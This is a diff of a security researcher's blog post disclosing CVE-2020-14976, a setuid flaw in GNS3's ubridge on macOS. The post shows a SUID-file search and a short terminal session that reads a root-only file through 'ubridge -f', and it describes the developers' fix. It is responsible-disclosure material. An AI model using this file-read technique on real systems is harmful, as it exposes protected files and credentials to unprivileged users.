@@ -1,349 +1,103 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
 <head>
-  <title>
-  CVE-2020-14976 - GNS3 ubridge SETUID bit - arbitrary file read · theevilbit blog
-</title>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="light dark">
-
-
-
-
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2020-14976 - GNS3 ubridge SETUID bit - arbitrary file read · theevilbit</title>
+<meta name="description" content="A couple of weeks ago, I had the idea of scanning my Mac for files that has the SUID bit set, I wanted to see if there is anything interesting showing up. You can do it this way:">
 <meta name="author" content="Csaba Fitzl">
-<meta name="description" content="A couple of weeks ago, I had the idea of scanning my Mac for files that has the SUID bit set, I wanted to see if there is anything interesting showing up. You can do it this way:
-/usr/bin/sudo find / -perm -4000 -exec /bin/ls -ldb {} \; &gt; suidfilelist
-There was one item that caught my attention, and that was a file called ubridge inside GNS3. I used to be a network guy, and GNS3 is a great tool to emulate real network gear, practice configuration, etc.. I highly recommend for anyone who learns networking. This was the file:">
-<meta name="keywords" content="blog,macos,apple,security,vulnerability,exploit,cve">
-
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="CVE-2020-14976 - GNS3 ubridge SETUID bit - arbitrary file read">
-  <meta name="twitter:description" content="A couple of weeks ago, I had the idea of scanning my Mac for files that has the SUID bit set, I wanted to see if there is anything interesting showing up. You can do it this way:
-/usr/bin/sudo find / -perm -4000 -exec /bin/ls -ldb {} \; &gt; suidfilelist There was one item that caught my attention, and that was a file called ubridge inside GNS3. I used to be a network guy, and GNS3 is a great tool to emulate real network gear, practice configuration, etc.. I highly recommend for anyone who learns networking. This was the file:">
-
-<meta property="og:url" content="https://theevilbit.github.io/posts/gns3_ubridge_setuid_bit_arbitrary_file_read/">
-  <meta property="og:site_name" content="theevilbit blog">
-  <meta property="og:title" content="CVE-2020-14976 - GNS3 ubridge SETUID bit - arbitrary file read">
-  <meta property="og:description" content="A couple of weeks ago, I had the idea of scanning my Mac for files that has the SUID bit set, I wanted to see if there is anything interesting showing up. You can do it this way:
-/usr/bin/sudo find / -perm -4000 -exec /bin/ls -ldb {} \; &gt; suidfilelist There was one item that caught my attention, and that was a file called ubridge inside GNS3. I used to be a network guy, and GNS3 is a great tool to emulate real network gear, practice configuration, etc.. I highly recommend for anyone who learns networking. This was the file:">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2019-05-28T00:00:00+00:00">
-    <meta property="article:modified_time" content="2019-05-28T00:00:00+00:00">
-    <meta property="article:tag" content="Macos">
-    <meta property="article:tag" content="Vulnerability">
-
-
-
-
 <link rel="canonical" href="https://theevilbit.github.io/posts/gns3_ubridge_setuid_bit_arbitrary_file_read/">
-
-
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
-
-
-  
-  
-  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.4410e480b3bad72c110a96b56e5aa8c36c24a0f3735b278818123b0fa4393fcd.css" integrity="sha256-RBDkgLO61ywRCpa1blqow2wkoPNzWyeIGBI7D6Q5P80=" crossorigin="anonymous" media="screen" />
-
-
-
-
-
-
-  
-    
-    
-    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css" integrity="sha256-rUj0didZdIhb3APVJR482&#43;FnjFSmP/dyN2sO0q3EaN0=" crossorigin="anonymous" media="screen" />
-  
-
-
-
- 
-
-
-
-
-<link rel="icon" type="image/svg+xml" href="https://theevilbit.github.io/images/favicon.svg" sizes="any">
-<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
-
-<link rel="apple-touch-icon" href="https://theevilbit.github.io/images/apple-touch-icon.png">
-<link rel="apple-touch-icon" sizes="180x180" href="https://theevilbit.github.io/images/apple-touch-icon.png">
-
-<link rel="manifest" href="https://theevilbit.github.io/site.webmanifest">
-<link rel="mask-icon" href="https://theevilbit.github.io/images/safari-pinned-tab.svg" color="#5bbad5">
-
-
-
-
-
-
-
-
-
+<link rel="alternate" type="application/rss+xml" title="theevilbit" href="/index.xml">
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<script>try { var t = localStorage.getItem("tb.theme"); document.documentElement.dataset.theme = t || "dark"; } catch (e) { document.documentElement.dataset.theme = "dark"; }</script>
+<link rel="preload" href="/fonts/IBMPlexSans-var.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="/fonts.css?v=1791269065">
+<link rel="stylesheet" href="/style.css?v=1791269065">
 </head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="/">the<span>evil</span>bit<i class="cursor"></i></a>
+    <nav class="nav"><a href="/posts/" class=on>Posts</a><a href="/beyond/">Beyond</a><a href="/talks/">Talks</a><a href="/shield/">Shield</a><a href="/about/">About</a><a href="/tags/">Tags</a></nav>
+    <button type="button" class="theme" id="theme" aria-label="switch light / dark">◐</button>
+  </header>
+  <main><article class="post">
+<header class="post-head"><h1>CVE-2020-14976 - GNS3 ubridge SETUID bit - arbitrary file read</h1>
+<div class="meta"><time datetime="2019-05-28">May 28, 2019</time><span>3 min read</span><span class="tags"><a class="tag" href="/tags/macos/">macos</a><a class="tag" href="/tags/vulnerability/">vulnerability</a></span></div></header>
+<div class="prose"><p>A couple of weeks ago, I had the idea of scanning my Mac for files that has the SUID bit set, I wanted to see if there is anything interesting showing up. You can do it this way:</p>
+<pre><code class=language-bash>/usr/bin/sudo find / -perm -4000 -exec /bin/ls -ldb {} \; &gt; suidfilelist</code></pre>
+<p>There was one item that caught my attention, and that was a file called <code>ubridge</code> inside GNS3. I used to be a network guy, and GNS3 is a great tool to emulate real network gear, practice configuration, etc.. I highly recommend for anyone who learns networking. This was the file:</p>
+<pre><code class=language-bash>ls -l /Applications/GNS3.app/Contents/Resources/ubridge
+-rwsr-x---@ 1 root  admin  61932 Apr 15 07:17 /Applications/GNS3.app/Contents/Resources/ubridge</code></pre>
+<p> I didn’t really had the idea what it does, so I took a look at the help:</p>
+<pre><code class=language-bash>/Applications/GNS3.app/Contents/Resources/ubridge -h
+Usage: /Applications/GNS3.app/Contents/Resources/ubridge [OPTION]
 
-
-
-
-
-
-<body class="preload-transitions colorscheme-auto">
-  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
-</div>
-
-
-  <main class="wrapper">
-    <nav class="navigation">
-  <section class="container">
-    
-    <a class="navigation-title" href="https://theevilbit.github.io/">
-      theevilbit blog
-    </a>
-    
-    
-      <input type="checkbox" id="menu-toggle" />
-      <label class="menu-button float-right" for="menu-toggle">
-        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
-      </label>
-      <ul class="navigation-list">
-        
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/posts/">Posts</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/talks/">Talks and Workshops</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/shield/">Shield.app</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/tags/">Tags</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/about/">About</a>
-            </li>
-          
-        
-        
-      </ul>
-    
-  </section>
-</nav>
-
-
-    <div class="content">
-      
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">
-            <a class="title-link" href="https://theevilbit.github.io/posts/gns3_ubridge_setuid_bit_arbitrary_file_read/">
-              CVE-2020-14976 - GNS3 ubridge SETUID bit - arbitrary file read
-            </a>
-          </h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
-              <time datetime="2019-05-28T00:00:00Z">
-                May 28, 2019
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              3-minute read
-            </span>
-          </div>
-          
-          <div class="categories">
-  <i class="fa-solid fa-folder" aria-hidden="true"></i>
-    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>
-
-          <div class="tags">
-  <i class="fa-solid fa-tag" aria-hidden="true"></i>
-    <span class="tag">
-      <a href="https://theevilbit.github.io/tags/macos/">Macos</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="https://theevilbit.github.io/tags/vulnerability/">Vulnerability</a>
-    </span></div>
-
-        </div>
-      </header>
-
-      <div class="post-content">
-        
-        <p>A couple of weeks ago, I had the idea of scanning my Mac for files that has the SUID bit set, I wanted to see if there is anything interesting showing up. You can do it this way:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/sudo find / -perm -4000 -exec /bin/ls -ldb <span style="color:#555">{}</span> <span style="color:#c30;font-weight:bold">\;</span> &gt; suidfilelist
-</span></span></code></pre></div><p>There was one item that caught my attention, and that was a file called <code>ubridge</code> inside GNS3. I used to be a network guy, and GNS3 is a great tool to emulate real network gear, practice configuration, etc.. I highly recommend for anyone who learns networking. This was the file:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /Applications/GNS3.app/Contents/Resources/ubridge
-</span></span><span style="display:flex;"><span>-rwsr-x---@ <span style="color:#f60">1</span> root  admin  <span style="color:#f60">61932</span> Apr <span style="color:#f60">15</span> 07:17 /Applications/GNS3.app/Contents/Resources/ubridge
-</span></span></code></pre></div><p>I didn’t really had the idea what it does, so I took a look at the help:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/Applications/GNS3.app/Contents/Resources/ubridge -h
-</span></span><span style="display:flex;"><span>Usage: /Applications/GNS3.app/Contents/Resources/ubridge <span style="color:#555">[</span>OPTION<span style="color:#555">]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Options:
-</span></span><span style="display:flex;"><span>  -h                           : Print this message and <span style="color:#366">exit</span>
-</span></span><span style="display:flex;"><span>  -f &lt;file&gt;                    : Specify a INI configuration file <span style="color:#555">(</span>default: ubridge.ini<span style="color:#555">)</span>
-</span></span><span style="display:flex;"><span>  -H <span style="color:#555">[</span>&lt;ip_address&gt;:<span style="color:#555">]</span>&lt;tcp_port&gt; : Run in hypervisor mode
-</span></span><span style="display:flex;"><span>  -e                           : Display all available network devices and <span style="color:#366">exit</span>
-</span></span><span style="display:flex;"><span>  -d &lt;level&gt;                   : Debug level
-</span></span><span style="display:flex;"><span>  -v                           : Print version and <span style="color:#366">exit</span>
-</span></span></code></pre></div><p>The most interesting for first sight was that it can read a file, considering that it will run as root, it should be able to read in any file. The question is if we can display it or not. Very quickly it turned out that yes, in case you supply a non INI file, it will cause a parsing error, and will print every single line.</p>
+Options:
+  -h                           : Print this message and exit
+  -f &lt;file&gt;                    : Specify a INI configuration file (default: ubridge.ini)
+  -H [&lt;ip_address&gt;:]&lt;tcp_port&gt; : Run in hypervisor mode
+  -e                           : Display all available network devices and exit
+  -d &lt;level&gt;                   : Debug level
+  -v                           : Print version and exit</code></pre>
+<p>The most interesting for first sight was that it can read a file, considering that it will run as root, it should be able to read in any file. The question is if we can display it or not. Very quickly it turned out that yes, in case you supply a non INI file, it will cause a parsing error, and will print every single line.</p>
 <p>Since the SUID flag is set for <code>ubridge</code>, it allows someone to read arbitrary files on the system.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#show current ID</span>
-</span></span><span style="display:flex;"><span>id
-</span></span><span style="display:flex;"><span><span style="color:#033">uid</span><span style="color:#555">=</span>501<span style="color:#555">(</span>csaby<span style="color:#555">)</span> <span style="color:#033">gid</span><span style="color:#555">=</span>20<span style="color:#555">(</span>staff<span style="color:#555">)</span> <span style="color:#033">groups</span><span style="color:#555">=</span>20<span style="color:#555">(</span>staff<span style="color:#555">)</span>,501<span style="color:#555">(</span>access_bpf<span style="color:#555">)</span>,12<span style="color:#555">(</span>everyone<span style="color:#555">)</span>,61<span style="color:#555">(</span>localaccounts<span style="color:#555">)</span>,79<span style="color:#555">(</span>_appserverusr<span style="color:#555">)</span>,80<span style="color:#555">(</span>admin<span style="color:#555">)</span>,81<span style="color:#555">(</span>_appserveradm<span style="color:#555">)</span>,98<span style="color:#555">(</span>_lpadmin<span style="color:#555">)</span>,701<span style="color:#555">(</span>com.apple.sharepoint.group.1<span style="color:#555">)</span>,703<span style="color:#555">(</span>com.apple.sharepoint.group.2<span style="color:#555">)</span>,33<span style="color:#555">(</span>_appstore<span style="color:#555">)</span>,100<span style="color:#555">(</span>_lpoperator<span style="color:#555">)</span>,204<span style="color:#555">(</span>_developer<span style="color:#555">)</span>,250<span style="color:#555">(</span>_analyticsusers<span style="color:#555">)</span>,395<span style="color:#555">(</span>com.apple.access_ftp<span style="color:#555">)</span>,398<span style="color:#555">(</span>com.apple.access_screensharing<span style="color:#555">)</span>,399<span style="color:#555">(</span>com.apple.access_ssh<span style="color:#555">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#show permission for a.txt, only root can read it</span>
-</span></span><span style="display:flex;"><span>ls -l a.txt 
-</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">2</span> May  <span style="color:#f60">8</span> 15:12 a.txt
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#try to read it as normal user</span>
-</span></span><span style="display:flex;"><span>cat a.txt 
-</span></span><span style="display:flex;"><span>cat: a.txt: Permission denied
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#show SUID flag for ubridge</span>
-</span></span><span style="display:flex;"><span>ls -l /Applications/GNS3.app/Contents/Resources/ubridge
-</span></span><span style="display:flex;"><span>-rwsr-x---@ <span style="color:#f60">1</span> root  admin  <span style="color:#f60">61932</span> Apr <span style="color:#f60">15</span> 07:17 /Applications/GNS3.app/Contents/Resources/ubridge
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#read file with sudo</span>
-</span></span><span style="display:flex;"><span>sudo cat a.txt 
-</span></span><span style="display:flex;"><span>Password:
-</span></span><span style="display:flex;"><span>a
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#read file with ubridge</span>
-</span></span><span style="display:flex;"><span>/Applications/GNS3.app/Contents/Resources/ubridge -f a.txt 
-</span></span><span style="display:flex;"><span>uBridge version 0.9.13 running with libpcap version 1.8.1 -- Apple version 79.250.1
-</span></span><span style="display:flex;"><span>iniparser: syntax error in a.txt <span style="color:#555">(</span>1<span style="color:#555">)</span>:
-</span></span><span style="display:flex;"><span>-&gt; a
-</span></span></code></pre></div><p>This is an open source project, so we can check the source code what causes this. It can be found here: <a href="https://github.com/GNS3/ubridge"  class="external-link" target="_blank" rel="noopener">GitHub - GNS3/ubridge: Bridge for UDP tunnels, Ethernet, TAP and VMnet interfaces.</a></p>
+<pre><code class=language-bash>#show current ID
+id
+uid=501(csaby) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),703(com.apple.sharepoint.group.2),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
+
+#show permission for a.txt, only root can read it
+ls -l a.txt 
+-rw-------  1 root  staff  2 May  8 15:12 a.txt
+
+#try to read it as normal user
+cat a.txt 
+cat: a.txt: Permission denied
+
+#show SUID flag for ubridge
+ls -l /Applications/GNS3.app/Contents/Resources/ubridge
+-rwsr-x---@ 1 root  admin  61932 Apr 15 07:17 /Applications/GNS3.app/Contents/Resources/ubridge
+
+#read file with sudo
+sudo cat a.txt 
+Password:
+a
+
+#read file with ubridge
+/Applications/GNS3.app/Contents/Resources/ubridge -f a.txt 
+uBridge version 0.9.13 running with libpcap version 1.8.1 -- Apple version 79.250.1
+iniparser: syntax error in a.txt (1):
+-&gt; a</code></pre>
+<p>This is an open source project, so we can check the source code what causes this. It can be found here: <a href="https://github.com/GNS3/ubridge" rel="noopener">GitHub - GNS3/ubridge: Bridge for UDP tunnels, Ethernet, TAP and VMnet interfaces.</a></p>
 <p>The following lines in the <code>iniparser.c</code> code causing this behaviour, in case it cannot parse the supplied file, it will print out every single line:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c0f">fprintf</span>(stderr, <span style="color:#c30">&#34;iniparser: syntax error in %s (%d):</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,
-</span></span><span style="display:flex;"><span>                    ininame,
-</span></span><span style="display:flex;"><span>                    lineno);
-</span></span><span style="display:flex;"><span><span style="color:#c0f">fprintf</span>(stderr, <span style="color:#c30">&#34;-&gt; %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, line);
-</span></span></code></pre></div><p>I did run a Google search to see if it’s known to the community or not. It turned out that it’s not, however <a href="https://twitter.com/hackerfantastic"  class="external-link" target="_blank" rel="noopener">Hacker Fantastic (@hackerfantastic) | Twitter</a> also reported an issue a while ago, that was a true privilege escalation:</p>
-<p><a href="https://gns3.com/discussions/gns3-local-privilege-escalation-"  class="external-link" target="_blank" rel="noopener">https://gns3.com/discussions/gns3-local-privilege-escalation-</a>
+<pre><code class=language-c>fprintf(stderr, "iniparser: syntax error in %s (%d):\n",
+                    ininame,
+                    lineno);
+fprintf(stderr, "-&gt; %s\n", line);</code></pre>
+<p>I did run a Google search to see if it’s known to the community or not. It turned out that it’s not, however <a href="https://twitter.com/hackerfantastic" rel="noopener">Hacker Fantastic (@hackerfantastic) | Twitter</a> also reported an issue a while ago, that was a true privilege escalation:</p>
+<p> <a href="https://gns3.com/discussions/gns3-local-privilege-escalation-" rel="noopener"><a href="https://gns3.com/discussions/gns3-local-privilege-escalation-" rel="noopener">https://gns3.com/discussions/gns3-local-privilege-escalation-</a></a> 
 That exploit is still available at:
-<a href="https://github.com/offensive-security/exploitdb/blob/master/exploits/osx/local/41873.sh"  class="external-link" target="_blank" rel="noopener">exploitdb/41873.sh at master · offensive-security/exploitdb · GitHub</a></p>
-<p>So I sent an email to the developers ( <a href="mailto:developers@gns3.net" >developers@gns3.net</a> ) detailing the problem. A couple of hours after reporting it, they actually pushed a fix to the GitHub repo:
-<a href="https://github.com/GNS3/ubridge/commit/2eb0d1dab6a6de76cf3556130a2d52af101077db"  class="external-link" target="_blank" rel="noopener">Hide errored line content during parsing configuration INI file on de… · GNS3/ubridge@2eb0d1d · GitHub</a></p>
+<a href="https://github.com/offensive-security/exploitdb/blob/master/exploits/osx/local/41873.sh" rel="noopener">exploitdb/41873.sh at master · offensive-security/exploitdb · GitHub</a></p>
+<p>So I sent an email to the developers ( <a href="mailto:developers@gns3.net">developers@gns3.net</a> ) detailing the problem. A couple of hours after reporting it, they actually pushed a fix to the GitHub repo:
+<a href="https://github.com/GNS3/ubridge/commit/2eb0d1dab6a6de76cf3556130a2d52af101077db" rel="noopener">Hide errored line content during parsing configuration INI file on de… · GNS3/ubridge@2eb0d1d · GitHub</a></p>
 <p>Essentially the fix is to eliminate printing out the error details.</p>
-<p><img src="https://theevilbit.github.io/images/GNS3_ubridge_SETUID_bit_arbitrary_file_read/Screenshot%202019-05-09%20at%209.56.35.png" alt="image1"></p>
-<p><img src="https://theevilbit.github.io/images/GNS3_ubridge_SETUID_bit_arbitrary_file_read/Screenshot%202019-05-09%20at%209.56.47.png" alt="image2"></p>
-<p><img src="https://theevilbit.github.io/images/GNS3_ubridge_SETUID_bit_arbitrary_file_read/Screenshot%202019-05-09%20at%209.56.56.png" alt="image3"></p>
+<p><img src="/images/GNS3_ubridge_SETUID_bit_arbitrary_file_read/Screenshot%202019-05-09%20at%209.56.35.png" alt="image1" loading="lazy"></p>
+<p><img src="/images/GNS3_ubridge_SETUID_bit_arbitrary_file_read/Screenshot%202019-05-09%20at%209.56.47.png" alt="image2" loading="lazy"></p>
+<p><img src="/images/GNS3_ubridge_SETUID_bit_arbitrary_file_read/Screenshot%202019-05-09%20at%209.56.56.png" alt="image3" loading="lazy"></p>
 <p>Kudos to the team for the quick fix!</p>
-<p>They confirmed the issue and it has been fixed in GNS 2.1.17.</p>
-
-      </div>
-
-
-      <footer>
-        
-
-
-        
-        
-        
-        
-        
-        
-        
-      </footer>
-    </article>
-
-    
-  </section>
-
-    </div>
-
-    <footer class="footer">
-  <section class="container">
-    ©
-    
-      2019 -
-    
-    2026
-     Csaba Fitzl 
-    ·
-    
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
-    
-  </section>
-</footer>
-
-  </main>
-
-  
-
-  
-  
-  <script src="https://theevilbit.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
+<p>They confirmed the issue and it has been fixed in GNS 2.1.17.</p></div>
+<nav class="pn"><a class="prev" href="/posts/vmware_fusion_11_guest_vm_rce_cve-2019-5514/"><span>← previous</span>CVE-2019-5514 - VMware Fusion 11 - Guest VM RCE</a><a class="next" href="/posts/getting_root_with_benign_appstore_apps/"><span>next →</span>TALK - macOS - Getting root with benign AppStore apps</a></nav></article></main>
+  <footer class="foot">
+    <span>© 2026 Csaba Fitzl</span>
+    <span class="social"><a href="https://github.com/theevilbit/" rel="me noopener">GitHub</a><a href="https://x.com/theevilbit" rel="me noopener">X</a><a href="/index.xml" rel="me noopener">RSS</a></span>
+  </footer>
+</div>
+<script>
+document.getElementById("theme").addEventListener("click", function () {
+  var t = document.documentElement.dataset.theme === "light" ? "dark" : "light";
+  document.documentElement.dataset.theme = t;
+  try { localStorage.setItem("tb.theme", t); } catch (e) {}
+});
+</script>
 </body>
 </html>
